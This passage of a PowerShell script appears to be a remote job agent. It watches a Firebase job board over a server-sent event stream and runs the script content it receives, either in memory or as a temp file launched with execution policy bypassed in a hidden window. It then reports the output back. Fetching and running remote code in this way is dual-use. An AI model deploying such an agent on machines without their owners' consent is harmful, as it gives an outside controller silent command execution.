                    progress_phase = "Executing in-memory..."
                    stdout = ($stdoutCollector -join "`r`n")
                    stderr = ($stderrCollector -join "`r`n")
                } | ConvertTo-Json -Compress

                $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
                $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $patchData -TimeoutSec 3
            }
        }

        # In-Memory Runspace
        try {
            [void]$ps.EndInvoke($asyncResult)
        } catch {
            $stderrCollector.Add("Execution exception: " + $_.ToString())
        }

        # 
        while ($outIdx -lt $outputCol.Count) {
            $item = $outputCol[$outIdx]
            if ($item -ne $null) {
                $str = $item.ToString()
                if ($stdoutTotalLength -lt $maxCharLimit) {
                    $stdoutCollector.Add($str)
                    $stdoutTotalLength += $str.Length
                }
            }
            $outIdx++
        }
        while ($infoIdx -lt $ps.Streams.Information.Count) {
            $info = $ps.Streams.Information[$infoIdx]
            if ($info -ne $null -and $info.MessageData -ne $null) {
                $str = $info.MessageData.ToString()
                if ($stdoutTotalLength -lt $maxCharLimit) {
                    $stdoutCollector.Add($str)
                    $stdoutTotalLength += $str.Length
                }
            }
            $infoIdx++
        }
        while ($warnIdx -lt $ps.Streams.Warning.Count) {
            $warn = $ps.Streams.Warning[$warnIdx]
            if ($warn -ne $null) {
                $str = "[WARNING] " + $warn.Message
                if ($stdoutTotalLength -lt $maxCharLimit) {
                    $stdoutCollector.Add($str)
                    $stdoutTotalLength += $str.Length
                }
            }
            $warnIdx++
        }
        while ($errIdx -lt $ps.Streams.Error.Count) {
            $err = $ps.Streams.Error[$errIdx]
            if ($err -ne $null) {
                $str = $err.ToString()
                if ($stderrTotalLength -lt $maxCharLimit) {
                    $stderrCollector.Add($str)
                    $stderrTotalLength += $str.Length
                }
            }
            $errIdx++
        }

        # Exit Code
        if ($ps.InvocationStateInfo.State -eq [System.Management.Automation.PSInvocationState]::Failed) {
            $exitCode = 1
        } else {
            try {
                $ps.Commands.Clear()
                [void]$ps.AddScript('$global:LASTEXITCODE')
                $lec = $ps.Invoke()
                if ($lec -ne $null -and $lec.Count -gt 0 -and $lec[0] -ne $null) {
                    $exitCode = [int]$lec[0]
                } else {
                    $exitCode = 0
                }
            } catch {
                $exitCode = 0
            }
        }

        $ps.Dispose()
    } else {
        # ENGINE 2: ISOLATED PROCESS MODE (Safety Fallback with UTF-8 BOM Encoding)
        Write-Host " -> [ENGINE 2: ISOLATED] Executing via Isolated Process..." -ForegroundColor Cyan
        $tempScriptPath = Join-Path $env:TEMP ("remote_script_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".ps1")
        [System.IO.File]::WriteAllText($tempScriptPath, $command, [System.Text.Encoding]::UTF8)

        try {
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = "powershell.exe"
            $processInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`""
            $processInfo.RedirectStandardOutput = $true
            $processInfo.RedirectStandardError = $true
            $processInfo.StandardOutputEncoding = [System.Text.Encoding]::UTF8
            $processInfo.StandardErrorEncoding = [System.Text.Encoding]::UTF8
            $processInfo.UseShellExecute = $false
            $processInfo.CreateNoWindow = $true

            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $processInfo

            $null = $process.Start()

            $stdoutTask = $process.StandardOutput.ReadToEndAsync()
            $stderrTask = $process.StandardError.ReadToEndAsync()

            $startTime = [DateTime]::UtcNow
            $lastAbortCheckTime = [DateTime]::UtcNow

            while (-not $process.WaitForExit(100)) {
                $now = [DateTime]::UtcNow

                if (($now - $lastAbortCheckTime).TotalMilliseconds -ge 500) {
                    $lastAbortCheckTime = $now
                    try {
                        $abortUrl = $BaseUrl + "jobs/$CurrentKey/$JobId/abort.json"
                        $abortVal = Invoke-FirebaseHttp -Uri $abortUrl -Method "GET" -TimeoutSec 2
                        if ($abortVal -and $abortVal.Trim().ToLower() -eq "true") {
                            Write-Host "`n -> [EMERGENCY ABORT] Abort signal received from controller!" -ForegroundColor Red
                            $isAborted = $true
                            try { Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue } catch {}
                            break
                        }
                    } catch {}
                }

                if (($now - $startTime).TotalSeconds -ge $timeoutSec) {
                    Write-Host "`n -> [TIMEOUT] Execution exceeded Hard Timeout (${timeoutSec}s)!" -ForegroundColor Red
                    $isTimedOut = $true
                    try { Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue } catch {}
                    break
                }
            }

            if (-not $process.HasExited) {
                $process.WaitForExit(3000)
            }
            $exitCode = if ($process.HasExited) { $process.ExitCode } else { 1 }

            try {
                $outText = $stdoutTask.Result
                if (-not [string]::IsNullOrEmpty($outText)) {
                    $stdoutCollector.Add($outText.TrimEnd())
                }
            } catch {}

            try {
                $errText = $stderrTask.Result
                if (-not [string]::IsNullOrEmpty($errText)) {
                    $stderrCollector.Add($errText.TrimEnd())
                }
            } catch {}
        }
        catch {
            $exitCode = 1
            $stderrCollector.Add("Execution exception: $_")
        }
        finally {
            if (Test-Path $tempScriptPath) { Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue }
        }
    }

    # 
    $finalStatus = "completed"
    if ($isAborted) {
        $finalStatus = "cancelled"
        $exitCode = 130
        $stderrCollector.Add("[JOB CANCELLED] Emergency abort requested by controller.")
    } elseif ($isTimedOut) {
        $finalStatus = "failed"
        $exitCode = 124
        $stderrCollector.Add("[JOB TIMEOUT] Process terminated after exceeding ${timeoutSec} seconds.")
    } elseif ($exitCode -ne 0) {
        $finalStatus = "failed"
    }

    Write-Host " -> Job execution finished: $finalStatus (Exit Code: $exitCode)" -ForegroundColor Green

    $finalBody = @{
        status = $finalStatus
        exit_code = $exitCode
        stdout = ($stdoutCollector -join "`r`n")
        stderr = ($stderrCollector -join "`r`n")
        completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    } | ConvertTo-Json -Compress

    $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
    $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $finalBody -TimeoutSec 15
}

Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
Write-Host "Status: Dual-Mode Event Engine Active. Listening for jobs..." -ForegroundColor Green
Write-Host "------------------------------------------------------" -ForegroundColor Cyan

$lastProcessedJob = ""

# Main Execution Loop: Dual-Mode (Real-Time SSE Push + Adaptive Polling Fallback)
try {
    while (-not $script:isExiting) {
        if ($script:restartRequested) {
            $script:restartRequested = $false
            Write-Host "`n======================================================================" -ForegroundColor DarkYellow
            Write-Host "         [SYSTEM RESTART] In-Place Agent Reset in Progress...         " -ForegroundColor Yellow
            Write-Host "======================================================================" -ForegroundColor DarkYellow
            Write-Host "  -> Remote Secret Key : " -NoNewline -ForegroundColor Gray
            Write-Host "[ $SecretKey ]" -NoNewline -ForegroundColor Green
            Write-Host " (MAINTAINED)" -ForegroundColor Yellow
            Write-Host "  -> State Reset       : Clearing Sockets, Cache & In-Memory Engine" -ForegroundColor Cyan
            
            # 
            Get-ChildItem -Path $env:TEMP -Filter "remote_script_*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            Get-ChildItem -Path $env:TEMP -Filter "agent_*_temp.json" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            try {
                [GC]::Collect()
                [GC]::WaitForPendingFinalizers()
            } catch {}
            
            # Claim  Cloud Command Board
            try {
                $claimUrl = $BaseUrl + "jobs/$SecretKey/claim.json"
                $claimBody = '{"claimed_at":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","status":"active","engine":"realtime_sse","tenant":"' + $displayTenant + '","restarted_at":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '"}'
                $null = Invoke-FirebaseHttp -Uri $claimUrl -Method "PUT" -Body $claimBody -TimeoutSec 10
            } catch {}
            
            Write-Host "  -> Status            : Reset complete. Ready for incoming commands!" -ForegroundColor Green
            Write-Host "======================================================================`n" -ForegroundColor DarkYellow
            Start-Sleep -Milliseconds 500
        }

        $sseActive = $false
        try {
            $streamUrl = $BaseUrl + "jobs/$SecretKey.json"
            if (-not [string]::IsNullOrWhiteSpace($script:FirebaseAuthToken)) {
                $sep = if ($streamUrl.Contains("?")) { "&" } else { "?" }
                if ($streamUrl -notmatch "[?&]auth=") {
                    $streamUrl = "$streamUrl${sep}auth=$script:FirebaseAuthToken"
                }
            }
            $request = [System.Net.HttpWebRequest]::Create($streamUrl)
            $request.Accept = "text/event-stream"
            if (-not [string]::IsNullOrWhiteSpace($script:JavisApiKey)) {
                $request.Headers["X-Javis-Key"] = $script:JavisApiKey
                if ($streamUrl -notlike "$BaseUrl*") {
                    $request.Headers["Authorization"] = "Bearer " + $script:JavisApiKey
                }
            }
            $request.Timeout = 35000
            $request.ReadWriteTimeout = 35000

            $response = $request.GetResponse()
            $stream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
            $sseActive = $true

            $dataBuffer = [System.Text.StringBuilder]::new()

            while (-not $reader.EndOfStream -and -not $script:isExiting) {
                $line = $reader.ReadLine()
                if ($null -eq $line) { break }

                # Heartbeat  28-30
                if (([DateTime]::UtcNow - $script:LastHeartbeatUtc).TotalSeconds -ge 28) {
                    Update-DeviceHeartbeat -Status "online"
                }

                if ($line.StartsWith("data: ")) {
                    $null = $dataBuffer.AppendLine($line.Substring(6))
                } elseif ($line -eq "") {
                    if ($dataBuffer.Length -gt 0) {
                        $rawJson = $dataBuffer.ToString().Trim()
                        [void]$dataBuffer.Clear()

                        if ($rawJson -and $rawJson -ne "null") {
                            try {
                                $eventObj = ConvertFrom-Json -InputObject $rawJson -ErrorAction SilentlyContinue
                                if ($eventObj) {
                                    $payload = if ($eventObj.data) { $eventObj.data } else { $eventObj }
                                    
                                    # Job  pending
                                    $targetJobId = $null
                                    $targetJobDetails = $null

                                    if ($payload -is [System.Management.Automation.PSCustomObject]) {
                                        # Job
                                        if ($payload.status -eq "pending" -and $payload.script_content) {
                                            $path = if ($eventObj.path) { $eventObj.path.TrimStart('/') } else { "" }
                                            $targetJobId = if ($path) { $path } else { "job-" + [Guid]::NewGuid().ToString().Substring(0, 8) }
                                            $targetJobDetails = $payload
                                        } else {
                                            # Object  Jobs
                                            foreach ($prop in $payload.PSObject.Properties) {
                                                if ($prop.Value -and $prop.Value.status -eq "pending") {
                                                    $targetJobId = $prop.Name
                                                    $targetJobDetails = $prop.Value
                                                    break
                                                }
                                            }
                                        }
                                    }

                                    if ($targetJobId -and $targetJobId -ne $lastProcessedJob) {
                                        try { $reader.Close() } catch {}
                                        try { $stream.Close() } catch {}
                                        try { $response.Close() } catch {}
                                        try { $request.Abort() } catch {}
                                        $sseActive = $false

                                        Execute-RemoteJob -JobId $targetJobId -JobDetails $targetJobDetails -BaseUrl $BaseUrl -CurrentKey $SecretKey
                                        $lastProcessedJob = $targetJobId
                                        Update-DeviceHeartbeat -Status "online"
                                        break
                                    }
                                }
                            } catch {}
                        }
                    }
                }
            }

            if ($sseActive) {
                try { $reader.Close() } catch {}
                try { $stream.Close() } catch {}
                try { $response.Close() } catch {}
                try { $request.Abort() } catch {}
                $sseActive = $false
            }
        }
        catch {
            try { if ($request) { $request.Abort() } } catch {}
            if (([DateTime]::UtcNow - $script:LastHeartbeatUtc).TotalSeconds -ge 28) {
                Update-DeviceHeartbeat -Status "online"
            }
            # SSE    Adaptive Fast Polling
            try {
                $queryUrl = $BaseUrl + "jobs/$SecretKey.json"
                $jsonRaw = Invoke-FirebaseHttp -Uri $queryUrl -Method "GET" -TimeoutSec 5
                if ($jsonRaw -and $jsonRaw.Trim() -ne "null" -and $jsonRaw.Trim().StartsWith("{")) {
                    $jobs = ConvertFrom-Json -InputObject $jsonRaw.Trim() -ErrorAction SilentlyContinue
                    if ($jobs -and $jobs -is [System.Management.Automation.PSCustomObject]) {
                        foreach ($prop in $jobs.PSObject.Properties) {
                            if ($prop.Value -and $prop.Value.status -eq "pending" -and $prop.Name -ne $lastProcessedJob) {
                                Execute-RemoteJob -JobId $prop.Name -JobDetails $prop.Value -BaseUrl $BaseUrl -CurrentKey $SecretKey
                                $lastProcessedJob = $prop.Name
                                Update-DeviceHeartbeat -Status "online"
                                break
                            }
                        }
                    }
                }
            } catch {}
            Start-Sleep -Seconds 1
        }
    }
}
finally {
    try { if ($request) { $request.Abort() } } catch {}
    & $cleanExitAction
}
